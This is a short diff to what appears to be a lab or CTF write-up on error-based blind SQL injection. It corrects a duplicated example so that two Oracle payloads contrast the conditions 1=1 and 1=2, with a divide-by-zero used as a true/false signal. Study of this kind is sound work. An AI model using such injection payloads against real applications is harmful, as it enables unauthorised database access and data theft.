@@ -28,7 +28,7 @@ Inject some conditions after TrackingId:
 When the query like this:
 ```SQL
 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO' || (SELECT CASE WHEN (1=1) THEN '' ELSE TO_CHAR(1/0) END FROM dual) || ''
-SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO' || (SELECT CASE WHEN (1=1) THEN '' ELSE TO_CHAR(1/0) END FROM dual) || ''
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO' || (SELECT CASE WHEN (1=2) THEN '' ELSE TO_CHAR(1/0) END FROM dual) || ''
 ```
 In first case the error don't appear because 1=1 is TRUE and query return `''` and concatenating TrackingId with empty string, the TrackingId is not changed so the query returns TRUE ID. In second case the error appear because 1=2 is FALSE and `TO_CHAR(1/0)`(error: divide-by-zero) is called cause the server return FALSE.
 
